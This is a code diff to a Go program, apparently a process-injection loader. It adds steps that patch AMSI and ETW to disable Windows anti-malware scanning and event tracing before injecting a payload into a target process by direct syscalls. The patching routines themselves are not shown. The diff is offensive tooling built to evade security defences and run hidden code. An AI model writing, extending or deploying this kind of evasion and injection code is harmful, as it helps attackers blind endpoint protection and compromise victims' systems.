@@ -655,6 +655,29 @@ func main() {
 	}
 
 	
+	// Apply security patches before injection
+	fmt.Println("Disabling security mechanisms...")
+	
+	// Patch AMSI (Anti-Malware Scan Interface)
+	fmt.Print("Patching AMSI... ")
+	if err := winapi.PatchAMSI(); err != nil {
+		fmt.Printf(" FAILED: %v\n", err)
+		// Don't exit on AMSI failure - continue with ETW patch
+	} else {
+		fmt.Println(" SUCCESS")
+	}
+	
+	// Patch ETW (Event Tracing for Windows)
+	fmt.Print("Patching ETW... ")
+	if err := winapi.PatchETW(); err != nil {
+		fmt.Printf(" FAILED: %v\n", err)
+		// Don't exit on ETW failure - continue with injection
+	} else {
+		fmt.Println(" SUCCESS")
+	}
+	
+	fmt.Println() // Empty line for better readability
+	
 	// Perform the injection
 	fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
 	err = directSyscallInjector(payload, selectedProcess.Pid)
